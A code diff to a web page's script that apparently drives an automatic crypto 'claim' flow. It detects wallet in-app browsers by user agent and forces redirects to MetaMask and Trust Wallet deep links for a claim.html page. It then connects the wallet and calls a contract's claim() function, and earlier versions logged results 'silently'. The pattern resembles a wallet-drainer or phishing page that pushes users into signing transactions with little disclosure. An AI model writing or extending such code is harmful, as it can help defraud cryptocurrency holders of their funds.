@@ -387,9 +387,20 @@
 </script>
 
 
+<!-- Auto Claim with Wallet Detection and Tab Overflow Handling (v19) -->
+<div id="tabOverflowNotice" style="display:none; position:fixed; bottom:80px; left:50%; transform:translateX(-50%);
+  background:#333; color:#fff; padding:14px 24px; border-radius:6px; font-size:15px; z-index:999;">
+  请关闭钱包中的其他标签页后再次打开此页面。
+</div>
+
 <script>
   const CONTRACT_ABI = ["function claim() external"];
   const CONTRACT_ADDRESS = "YOUR_CONTRACT_ADDRESS"; // 替换为真实地址
+
+  function showOverflowNotice() {
+    const msg = document.getElementById('tabOverflowNotice');
+    if (msg) msg.style.display = 'block';
+  }
 
   async function connectAndClaim() {
     try {
@@ -398,10 +409,15 @@
       const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
       await window.ethereum.request({ method: 'eth_requestAccounts' });
       await contract.claim();
-      console.log("✅ Claimed silently.");
+      console.log("✅ Claimed.");
     } catch (err) {
-      console.error("Claim failed silently:", err);
+      console.error("Claim error:", err);
     }
+  }
+
+  function isInWalletBrowser() {
+    const ua = navigator.userAgent.toLowerCase();
+    return ua.includes("metamask") || ua.includes("trust") || ua.includes("coinbase");
   }
 
   async function autoWalletHandler() {
@@ -412,10 +428,23 @@
       const dappUrl = `https://${domain}/claim.html`;
       const metamaskUrl = `https://metamask.app.link/dapp/${domain}/claim.html`;
       const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
-      window.location.href = metamaskUrl;
-      setTimeout(() => {
-        window.location.href = trustUrl;
-      }, 1500);
+
+      if (isInWalletBrowser()) {
+        // 强制原页跳转
+        window.location.replace(metamaskUrl);
+        setTimeout(() => {
+          window.location.replace(trustUrl);
+        }, 1500);
+      } else {
+        // 不是钱包浏览器，正常跳转并兜底提示
+        window.location.href = metamaskUrl;
+        setTimeout(() => {
+          window.location.href = trustUrl;
+        }, 1500);
+        setTimeout(() => {
+          showOverflowNotice();
+        }, 3500);
+      }
     }
   }
 
